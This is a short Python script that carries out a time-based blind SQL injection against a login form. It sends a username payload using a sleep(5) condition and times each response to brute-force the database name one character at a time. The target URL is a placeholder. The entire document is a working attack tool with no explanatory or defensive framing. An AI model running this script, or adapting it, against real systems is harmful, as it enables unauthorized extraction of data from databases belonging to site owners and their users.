import requests
import string
import time
import sys

def bruteforcer():
    chars = string.printable[:-6]
    print(chars)
    session = requests.session()
    url = "url goes here"
    database_name = ""
    while True:
        for char in chars:
            name = f"{database_name}{char}"
            sys.stdout.write(f"\r[+]Database name: {name}")
            payload = f"admin' AND (select sleep(5) from dual where database() like '{name}%');-- -"
            data = {"username" : payload,
                    "password" : "test"}
            time_started = time.time()
            output = session.post(url,data=data,allow_redirects = False)
            time_finished = time.time()
            time_taken = time_finished - time_started
            if time_taken < 5:
                pass
            elif char == '%':
                pass
            else:
                database_name += char
                break

if __name__ == ("__main__"):
    bruteforcer()

